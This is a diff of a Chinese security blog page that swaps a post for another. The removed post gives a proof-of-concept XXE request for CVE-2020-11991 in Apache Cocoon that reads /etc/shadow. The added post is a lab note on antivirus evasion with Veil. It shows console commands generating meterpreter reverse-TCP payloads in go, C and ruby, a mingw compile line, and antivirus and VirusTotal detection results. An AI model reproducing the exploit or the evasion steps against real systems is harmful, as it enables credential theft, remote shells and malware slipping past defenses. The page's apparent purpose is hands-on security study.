@@ -5,7 +5,7 @@
     <meta http-equiv="X-UA-Compatible" content="IE=11,IE=10,IE=9,IE=8" >
     <meta name="baidu-site-verification" content="dIcXMeY8Ya" />
     
-    <title>CVE-2020-11991 Apache Cocoon XML 外部实体注入漏洞POC | Sec H</title>
+    <title>免杀实验笔记之Veil | Sec H</title>
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0" >
     <meta name="keywords" content="Sec H, 信息安全, Web安全, 渗透测试, 编程语言" >
     <meta name="description" content="Sec H 信息安全小站" >
@@ -17,7 +17,7 @@
     <link rel="shortcut icon" href="/favicon.ico" >
     
     
-<link rel="stylesheet" href="/css/style.css?v=1610799478071.css">
+<link rel="stylesheet" href="/css/style.css?v=1610800214356.css">
 
     <!--[if lt IE 9]>
     
@@ -50,11 +50,11 @@
         <div class="dropnav icon-paragraph-justify" id="JELON__btnDropNav"></div>
         <ul class="menu hidden" id="JELON__menu">
             
-            <li rel="/2020/12/23/CVE-2020-11991%20Apache%20Cocoon%20XML%20%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9EPOC/index.html" class="item ">
+            <li rel="/2021/01/16/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0%E4%B9%8BVeil/index.html" class="item ">
                 <a href="/" title="首页" class="icon-home">&nbsp;首页</a>
             </li>
             
-            <li rel="/2020/12/23/CVE-2020-11991%20Apache%20Cocoon%20XML%20%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9EPOC/index.html" class="item ">
+            <li rel="/2021/01/16/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0%E4%B9%8BVeil/index.html" class="item ">
                 <a href="/about/" title="关于" class="icon-about">&nbsp;关于</a>
             </li>
             
@@ -105,27 +105,40 @@
 <!-- 文章 -->
 <article class="post article">
     <header class="text-center">
-        <h3 class="post-title"><span>CVE-2020-11991 Apache Cocoon XML 外部实体注入漏洞POC</span></h3>
+        <h3 class="post-title"><span>免杀实验笔记之Veil</span></h3>
     </header>
     <p class="post-meta text-center">
-        Jelon 发表于
-        <time datetime="2020-12-23T09:09:02.564Z">2020-12-23</time>
+        givemefivw 发表于
+        <time datetime="2021-01-16T12:25:58.000Z">2021-01-16</time>
     </p>
     <div id="JELON__articlePostContent" class="post-content">
-        <h2 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h2><p>Apache Cocoon &lt;= 2.1.12</p>
-<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>向<code>/v2/api/product/manger/getInfo</code>位置 <code>POST</code>如下内容即可</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--?xml version&#x3D;&quot;1.0&quot; ?--&gt;</span><br><span class="line">&lt;!DOCTYPE replace [&lt;!ENTITY ent SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;shadow&quot;&gt; ]&gt;</span><br><span class="line">&lt;userInfo&gt;</span><br><span class="line">&lt;firstName&gt;John&lt;&#x2F;firstName&gt;</span><br><span class="line">&lt;lastName&gt;&amp;ent;&lt;&#x2F;lastName&gt;</span><br><span class="line">&lt;&#x2F;userInfo&gt;</span><br></pre></td></tr></table></figure>
+        <h2 id="直接生成exe免杀"><a href="#直接生成exe免杀" class="headerlink" title="直接生成exe免杀"></a>直接生成exe免杀</h2><p>选择Evasion&gt;use 16<br><img src="/2021/01/16/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0%E4%B9%8BVeil/2.png"><br>设置监听地址</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[go&#x2F;meterpreter&#x2F;rev_tcp&gt;&gt;]: set LHOST 192.168.70.133</span><br><span class="line">[go&#x2F;meterpreter&#x2F;rev_tcp&gt;&gt;]: set LPORT 2244</span><br><span class="line">[go&#x2F;meterpreter&#x2F;rev_tcp&gt;&gt;]: generate</span><br></pre></td></tr></table></figure>
+<p>设置好output的名字即可<br><img src="/2021/01/16/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0%E4%B9%8BVeil/3.png"></p>
+<p>在/tmp/veil-output/compiled/目录可直接找到生成的payload文件<br><img src="/2021/01/16/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0%E4%B9%8BVeil/4.png"></p>
+<p>在测试机中上线测试，正常上线<br><img src="/2021/01/16/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0%E4%B9%8BVeil/5.png"><br>但是被火绒查杀到<br><img src="/2021/01/16/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0%E4%B9%8BVeil/6.png"></p>
+<h2 id="VT查杀率-47-71"><a href="#VT查杀率-47-71" class="headerlink" title="VT查杀率(47/71)"></a>VT查杀率(47/71)</h2><p><img src="/2021/01/16/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0%E4%B9%8BVeil/7.png"></p>
+<h2 id="Veil结合Mingw免杀"><a href="#Veil结合Mingw免杀" class="headerlink" title="Veil结合Mingw免杀"></a>Veil结合Mingw免杀</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[c&#x2F;meterpreter&#x2F;rev_tcp&gt;&gt;]: set LHOST 192.168.70.133</span><br><span class="line">[c&#x2F;meterpreter&#x2F;rev_tcp&gt;&gt;]: set LPORT 4466</span><br><span class="line">[c&#x2F;meterpreter&#x2F;rev_tcp&gt;&gt;]: generate</span><br></pre></td></tr></table></figure>
+<p>生成c的payload<br><img src="/2021/01/16/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0%E4%B9%8BVeil/8.png"></p>
+<p>然后用mingw编译c文件到exe文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -o veil_c_test.exe veil_c_test.c -l ws2_32</span><br></pre></td></tr></table></figure>
+<p>可被火绒查杀到</p>
+<p>msf监听，出现假session<br><img src="/2021/01/16/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0%E4%B9%8BVeil/10.png"></p>
+<p>VT查杀率(3/71)<br><img src="/2021/01/16/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0%E4%B9%8BVeil/9.png"></p>
+<h2 id="Veil使用ruby-meterpreter-reverse-tcp-py"><a href="#Veil使用ruby-meterpreter-reverse-tcp-py" class="headerlink" title="Veil使用ruby/meterpreter/reverse_tcp.py"></a>Veil使用ruby/meterpreter/reverse_tcp.py</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[ruby&#x2F;meterpreter&#x2F;rev_tcp&gt;&gt;]: set LHOST 192.168.70.135</span><br><span class="line">[ruby&#x2F;meterpreter&#x2F;rev_tcp&gt;&gt;]: set LPORT 8899</span><br><span class="line">[ruby&#x2F;meterpreter&#x2F;rev_tcp&gt;&gt;]: generate</span><br></pre></td></tr></table></figure>
+<p>设置好输出文件的名字，在输出文件夹即可找到生成的payload<br>上传到测试机<br>不幸的是，火绒和360杀毒都能检测到<br><img src="/2021/01/16/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0%E4%B9%8BVeil/11.png"><br>在火绒和360管家开启的状态下，无法正常上线，关闭则可以<br><img src="/2021/01/16/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0%E4%B9%8BVeil/12.png"></p>
+
     </div>
     <p class="eof">-- EOF --</p>
     <p class="post-meta">
         <span class="post-cat">分类：
-            
+            <a class="cat-link" href="/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/">技术文章</a>
         </span>
         <span class="post-tags">
             标签：
             
     
-        <a href="/tags/POC/" title="POC">POC</a>
+        <a href="/tags/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/" title="免杀实验笔记">免杀实验笔记</a>
     
 
         </span>
@@ -151,9 +164,9 @@
     
     <span class="prev fl">
         上一篇<br >
-        <a href="/2021/01/14/%E8%87%B4%E8%BF%9COA-ajaxAction-formulaManager-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">
+        <a href="/2021/01/16/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0%E4%B9%8BShellter/">
             
-                致远OA ajaxAction formulaManager 文件上传漏洞
+                免杀实验笔记之Shellter
             
         </a>
     </span>
@@ -162,7 +175,7 @@
     
     <span class="next fr">
         下一篇<br >
-        <a href="/2020/12/23/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0%E4%B9%8BDKMC/">
+        <a href="/2021/01/16/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0%E4%B9%8BDKMC/">
             
                 免杀实验笔记之DKMC
             
@@ -212,12 +225,12 @@
     
     <li>
         <a href="/categories/POC-EXP/">POC&amp;EXP</a>
-        <span class="badge">(6)</span>
+        <span class="badge">(7)</span>
     </li>
     
     <li>
         <a href="/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/">技术文章</a>
-        <span class="badge">(3)</span>
+        <span class="badge">(6)</span>
     </li>
     
 </ul>
@@ -279,7 +292,7 @@
     <!--博客js脚本 -->
     <!-- 这里放网站js脚本 -->
 
-<script src="/js/main.js?v=1610799478072.js"></script>
+<script src="/js/main.js?v=1610800214356.js"></script>
 
 
 </body>
